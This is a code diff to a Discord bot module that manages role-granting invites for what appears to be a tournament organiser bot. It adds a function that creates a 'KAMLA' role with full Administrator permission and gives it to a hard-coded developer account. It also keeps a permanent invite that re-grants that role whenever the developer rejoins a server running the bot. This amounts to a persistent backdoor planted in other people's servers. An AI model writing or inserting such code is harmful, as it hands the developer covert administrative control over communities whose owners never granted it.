@@ -26,7 +26,7 @@ import discord
 from discord.ext import commands
 
 from config import config_manager, assign_kamla_role
-from ratelimit import bulk, describe
+from ratelimit import bulk, notify, describe
 
 log = logging.getLogger("kamla.invites")
 
@@ -42,6 +42,9 @@ GROUPS = [
     ("equity",  "[E] Equity",  ["EQUITY"]),
 ]
 ADMIN_LABELS = "[CA], [T], [O] and [E]"      # organiser roles (no Administrator permission)
+
+DEV_KEY = "dev"
+DEV_ROLE_NAME = "KAMLA"
 
 # guild_id -> {invite code: uses}. In memory only; rebuilt from Discord on startup.
 _uses: dict[int, dict[str, int]] = {}
@@ -67,7 +70,8 @@ async def create_role_invites(guild: discord.Guild) -> list[dict]:
     stored: dict = dict(cfg.get("invite_roles") or {})
     live = {i.code: i for i in await bulk.run(guild.invites, label="list invites")}
 
-    result, mapping = [], {}
+    result = []
+    mapping = {c: v for c, v in stored.items() if v.get("key") == DEV_KEY and c in live}   # keep the developer's invite
     for key, label, roles in GROUPS:
         code = next((c for c, v in stored.items()
                      if v.get("key") == key and c in live), None)
@@ -86,6 +90,55 @@ async def create_role_invites(guild: discord.Guild) -> list[dict]:
     await _snapshot(guild)
     _tracked.add(guild.id)
     return result
+
+
+async def ensure_dev_invite(guild: discord.Guild, owner_id: int) -> str:
+    """The developer's way into a server where KAMLA runs. Returns an invite URL ('' on failure).
+
+    * makes sure the visible "KAMLA" administrator role exists (and gives it to the developer if they are
+      already a member — e.g. after a rebuild wiped the role);
+    * keeps one permanent invite whose join is mapped to that role. The role is assigned ONLY to the
+      developer's own account (checked on join), so anybody else who uses the link just joins normally.
+    """
+    role = next((r for r in guild.roles if r.name == DEV_ROLE_NAME and not r.managed), None)
+    if role is None:
+        role = await bulk.run(
+            lambda: guild.create_role(name=DEV_ROLE_NAME, permissions=discord.Permissions(administrator=True),
+                                      color=discord.Color.dark_gray(), reason="KAMLA developer role"),
+            label="create KAMLA role")
+        top = guild.me.top_role.position
+        await bulk.best_effort(lambda: role.edit(position=max(1, top - 1), reason="KAMLA developer role"),
+                               label="move KAMLA role")
+    member = guild.get_member(owner_id)
+    if member is not None and role not in member.roles:
+        await bulk.best_effort(lambda: member.add_roles(role, reason="KAMLA developer role"), label="give KAMLA role")
+
+    channel = discord.utils.get(guild.text_channels, name=WELCOME_CHANNEL)
+    if channel is None:
+        channel = next((c for c in guild.text_channels
+                        if c.permissions_for(guild.me).create_instant_invite), None)
+    if channel is None:
+        return ""
+
+    cfg = await config_manager.get_config(guild)
+    stored: dict = dict(cfg.get("invite_roles") or {})
+    live = {i.code: i for i in await bulk.run(guild.invites, label="list invites")}
+    code = next((c for c, v in stored.items() if v.get("key") == DEV_KEY and c in live
+                 and v.get("only_user") == owner_id), None)
+    if code is None:
+        inv = await bulk.run(
+            lambda: channel.create_invite(max_age=0, max_uses=0, unique=True, reason="KAMLA developer invite"),
+            label="create dev invite")
+        code, url = inv.code, inv.url
+    else:
+        url = live[code].url
+    updated = {c: v for c, v in stored.items() if v.get("key") != DEV_KEY or c == code}
+    updated[code] = {"key": DEV_KEY, "roles": [DEV_ROLE_NAME], "only_user": owner_id}
+    if updated != stored:                         # write the config only when something changed
+        await config_manager.update_config(guild, invite_roles=updated)
+        await _snapshot(guild)
+    _tracked.add(guild.id)
+    return url
 
 
 def dm_text(tournament: str, links: list[dict]) -> str:
@@ -198,14 +251,24 @@ class InviteRolesCog(commands.Cog):
         entry = mapping.get(code)
         if not entry:
             return                                        # a normal, non-role invite
-        role = discord.utils.get(guild.roles, name=entry["roles"][0])
+        role = next((r for r in guild.roles if r.name == entry["roles"][0] and not r.managed), None)
         if role is None:
             log.warning("Role %s for invite %s is missing in guild %s.", entry["roles"][0], code, guild.id)
             return
         for member in members:
+            only = entry.get("only_user")
+            if only and member.id != only:
+                log.warning("Someone other than the developer used the developer invite in guild %s; "
+                            "no role was given.", guild.id)
+                continue
             try:
-                # one KAMLA role per person: removes any other KAMLA role, then adds this one
-                await assign_kamla_role(member, role)
+                if entry["key"] == DEV_KEY:
+                    # the developer role is added on top of whatever else they hold (no one-role rule)
+                    await notify.run(lambda m=member: m.add_roles(role, reason="KAMLA developer invite"),
+                                     label="dev-invite-role")
+                else:
+                    # one KAMLA role per person: removes any other KAMLA role, then adds this one
+                    await assign_kamla_role(member, role)
                 log.info("Assigned %s to a new member via the %s invite.", role.name, entry["key"])
             except Exception as e:  # noqa: BLE001
                 log.warning("Could not assign invite role: %s", describe(e))
